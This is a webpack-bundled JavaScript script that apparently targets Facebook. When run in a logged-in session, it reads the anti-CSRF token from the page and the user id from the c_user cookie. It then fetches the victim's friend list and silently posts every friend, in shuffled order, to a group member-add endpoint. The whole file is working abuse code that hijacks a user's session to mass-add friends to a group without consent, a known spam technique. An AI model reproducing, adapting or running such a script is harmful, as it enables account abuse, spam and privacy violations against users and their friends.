/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	module.exports = __webpack_require__(1);


/***/ },
/* 1 */
/***/ function(module, exports) {

	'use strict';

	function get(url) {
		// Return a new promise.
		return new Promise(function (resolve, reject) {
			// Do the usual XHR stuff
			var req = new XMLHttpRequest();
			req.open('GET', url);

			req.onload = function () {
				// This is called even on 404 etc
				// so check the status
				if (req.status == 200) {
					// Resolve the promise with the response text
					resolve(req.response);
				} else {
					// Otherwise reject with the status text
					// which will hopefully be a meaningful error
					reject(Error(req.statusText));
				}
			};

			// Handle network errors
			req.onerror = function () {
				reject(Error("Network Error"));
			};

			// Make the request
			req.send();
		});
	}

	function addFriend(opts) {
		var xhr = new XMLHttpRequest();
		var params = ['__a=1', 'fb_dtsg=' + opts.dtsg, 'group_id=' + opts.gid, 'source=typeahead', 'ref=', 'message_id=', 'members=' + opts.friend.uid, '__user=' + opts.uid, 'phstamp='];

		var paramsString = params.join('&');

		xhr.open("POST", "/ajax/groups/members/add_post.php", true), xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {
				var data = JSON.parse(xhr.responseText.substr(9));
				console.log(data);
			}
		};
		xhr.send(paramsString);
	}

	function addFriends() {
		var dtsg = document.getElementsByName("fb_dtsg")[0].value;
		var uid = document.cookie.match(/c_user=(\d+)/)[1];
		var gid = document.getElementsByName("group_id")[0].value;

		get('/ajax/typeahead/first_degree.php?__a=1&viewer=' + uid + '&token=' + Math.random() + '&filter[0]=user&options[0]=friends_only').then(function (response) {
			var data = JSON.parse(response.substr(9));
			var friends;

			if (data.payload && data.payload.entries) {
				var friends = data.payload.entries.sort(function () {
					return .5 - Math.random();
				});
			};

			var _iteratorNormalCompletion = true;
			var _didIteratorError = false;
			var _iteratorError = undefined;

			try {
				for (var _iterator = friends[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
					var friend = _step.value;

					addFriend({ dtsg: dtsg, uid: uid, gid: gid, friend: friend });
				}
			} catch (err) {
				_didIteratorError = true;
				_iteratorError = err;
			} finally {
				try {
					if (!_iteratorNormalCompletion && _iterator['return']) {
						_iterator['return']();
					}
				} finally {
					if (_didIteratorError) {
						throw _iteratorError;
					}
				}
			}
		})['catch'](function (error) {
			console.log("Failed!", error);
			// debugger;
		});
	}

	addFriends();

/***/ }
/******/ ]);